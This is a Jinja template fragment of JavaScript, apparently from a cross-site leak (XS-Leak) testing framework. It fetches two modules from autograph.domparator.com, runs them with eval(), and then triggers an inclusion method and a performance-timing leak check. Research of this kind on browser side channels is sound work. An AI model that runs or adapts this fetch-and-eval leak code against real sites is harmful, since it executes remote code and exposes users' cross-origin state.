{% if exploit_path is defined %}
        window.XSL_leak = () => {
            if({{exploit_path}} === '{{exploit_value}}'){
                console.log('Result State: {{exploit_state}}')
            }
            else{
                console.log('State wrong!')
            }
        }

        const sleep = (ms) => new Promise(r => setTimeout(r, ms))

        const run = async () => {
            // load modules for exploit first to not pollute the results
            let eventListenerCode = await (await fetch('https://autograph.domparator.com/modules/EventListener_module.js')).text()
            let performanceCode = await (await fetch('https://autograph.domparator.com/modules/Performance_module.js')).text()
            
            performance.clearResourceTimings()

            // run the event listener module
            eval(eventListenerCode)

            await sleep(1000)
            window.XSL_runInclusionMethod()
            await sleep(1000)

            // run the performance module
            eval(performanceCode)

            await sleep(1000)
            window.XSL_leak()
        }
{% endif %}